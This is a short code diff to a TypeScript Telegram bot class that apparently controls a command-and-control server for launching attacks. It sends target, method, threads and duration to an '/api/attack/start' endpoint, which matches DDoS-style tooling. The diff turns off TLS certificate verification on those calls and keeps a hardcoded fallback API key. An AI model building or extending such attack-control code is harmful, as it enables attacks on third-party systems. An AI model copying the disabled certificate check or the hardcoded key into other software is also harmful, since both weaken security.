@@ -459,6 +459,7 @@ export class TelegramBotInline {
         const apiKey = this.config.c2?.apiKey || 'aryzz-c2-api-key-2024';
 
         try {
+            const https = await import('https');
             const response = await axios.post(
                 `${c2Url}/api/attack/start`,
                 { target, method, threads, duration, rpc },
@@ -467,7 +468,10 @@ export class TelegramBotInline {
                         'X-API-Key': apiKey,
                         'Content-Type': 'application/json'
                     },
-                    timeout: 10000
+                    timeout: 10000,
+                    httpsAgent: new https.Agent({
+                        rejectUnauthorized: false
+                    })
                 }
             );
 
@@ -500,9 +504,13 @@ export class TelegramBotInline {
         const apiKey = this.config.c2?.apiKey || 'aryzz-c2-api-key-2024';
 
         try {
+            const https = await import('https');
             const response = await axios.get(`${c2Url}/api/stats/overview`, {
                 headers: { 'X-API-Key': apiKey },
-                timeout: 5000
+                timeout: 5000,
+                httpsAgent: new https.Agent({
+                    rejectUnauthorized: false
+                })
             });
 
             const stats = response.data.stats;
